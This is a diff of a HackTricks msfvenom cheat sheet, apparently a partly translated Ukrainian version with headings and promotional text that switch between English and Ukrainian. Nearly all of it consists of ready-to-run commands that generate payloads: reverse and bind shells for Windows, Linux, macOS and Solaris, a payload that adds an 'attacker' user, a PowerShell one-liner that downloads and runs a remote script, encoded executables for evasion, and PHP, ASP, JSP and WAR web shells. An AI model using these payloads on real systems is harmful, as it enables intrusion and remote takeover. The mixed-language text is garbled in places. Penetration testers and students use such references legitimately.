@@ -1,41 +1,44 @@
-# MSFVenom - Шпаргалка
+# MSFVenom - CheatSheet
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити вашу **компанію в рекламі на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Приєднуйтесь до [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) сервера, щоб спілкуватися з досвідченими хакерами та мисливцями за вразливостями!
+Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
-**Інсайти щодо Хакінгу**\
-Взаємодійте з контентом, який досліджує захоплення та виклики хакінгу
+**Hacking Insights**\
+Залучайте контент, який занурюється в захоплення та виклики хакінгу
 
-**Новини про Хакінг у Реальному Часі**\
-Будьте в курсі швидкозмінного світу хакінгу завдяки новинам та інсайтам у реальному часі
+**Real-Time Hack News**\
+Будьте в курсі швидкоплинного світу хакінгу через новини та інсайти в реальному часі
 
-**Останні Оголошення**\
-Будьте в курсі нових програм винагород за вразливості та важливих оновлень платформи
+**Latest Announcements**\
+Залишайтеся в курсі нових програм винагород за вразливості та важливих оновлень платформ
 
-**Приєднуйтесь до нас на** [**Discord**](https://discord.com/invite/N3FrSbmwdy) та почніть співпрацювати з найкращими хакерами вже сьогодні!
+**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
 ***
 
-## Основний msfvenom
+## Basic msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Також можна використовувати `-a` для вказання архітектури або `--platform`
+One can also use the `-a` to specify the architecture or the `--platform`
+
+## Listing
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
@@ -48,59 +51,67 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-### **Зворотній шелл**
+## **Windows**
+
+### **Зворотний Shell**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-### Прив'язка оболонки
+### Bind Shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-### Створення користувача
+### Створити користувача
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-### Оболонка CMD
+{% endcode %}
+
+### CMD Shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Виконання команди**
+### **Виконати команду**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
-### Кодувальник
+### Encoder
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Вбудовано виконуваний файл
+{% endcode %}
+
+### Вбудовано в виконуваний файл
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## Linux Payloads
+{% endcode %}
 
-### Зворотний шел
+## Linux Пейлоади
+
+### Реверсна оболонка
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
-### Прив'язка оболонки
+### Bind Shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -114,47 +125,63 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **MAC Payloads**
+{% endcode %}
 
-### **Reverse Shell:**
+## **MAC Пейлоади**
+
+### **Реверсний Шелл:** 
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-### **Прив'язка оболонки**
+{% endcode %}
+
+### **Bind Shell**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Веб-орієнтовані Payloads**
+{% endcode %}
+
+## **Веб-орієнтовані корисні навантаження**
 
 ### **PHP**
 
-#### Зворотній шелл
+#### Зворотний шел**л
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
+{% endcode %}
+
 ### ASP/x
 
-#### Зворотній shell
+#### Зворотний шелл
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
+{% endcode %}
+
 ### JSP
 
-#### Зворотній shell
+#### Зворотний шелл
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
+{% endcode %}
+
 ### ВІЙНА
 
-#### Зворотний шел
+#### Реверсна оболонка
 
 {% code overflow="wrap" %}
 ```bash
@@ -166,7 +193,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Сценарії мови**
+## **Скриптові мови навантаження**
 
 ### **Perl**
 
@@ -174,45 +201,44 @@ msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
 ```
-### **Python**
+{% endcode %}
 
-{% code overflow="wrap" %}
+### **Python**
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
 ### **Bash**
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Приєднуйтесь до сервера [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), щоб спілкуватися з досвідченими хакерами та мисливцями за багами!
+Приєднуйтесь до [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) сервера, щоб спілкуватися з досвідченими хакерами та шукачами вразливостей!
 
-**Інсайти щодо хакінгу**\
-Взаємодійте з контентом, який досліджує захоплення та виклики хакінгу
+**Інсайти з хакінгу**\
+Залучайтеся до контенту, який занурюється у захоплення та виклики хакінгу
 
 **Новини про хакінг у реальному часі**\
-Будьте в курсі швидкозмінного світу хакінгу завдяки новинам та інсайтам у реальному часі
+Слідкуйте за швидкоплинним світом хакінгу через новини та інсайти в реальному часі
 
 **Останні оголошення**\
-Будьте в курсі найновіших запусків баг баунті та важливих оновлень платформи
+Будьте в курсі нових програм винагород за вразливості та важливих оновлень платформ
 
-Приєднуйтесь до нас на [**Discord**](https://discord.com/invite/N3FrSbmwdy) та почніть співпрацювати з найкращими хакерами вже сьогодні!
+**Приєднуйтесь до нас на** [**Discord**](https://discord.com/invite/N3FrSbmwdy) і почніть співпрацювати з провідними хакерами вже сьогодні!
+
+{% hint style="success" %}
+Вчіться та практикуйте хакінг AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вчіться та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримати HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити свою **компанію рекламовану на HackTricks** або **завантажити HackTricks у PDF-форматі**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
+{% endhint %}
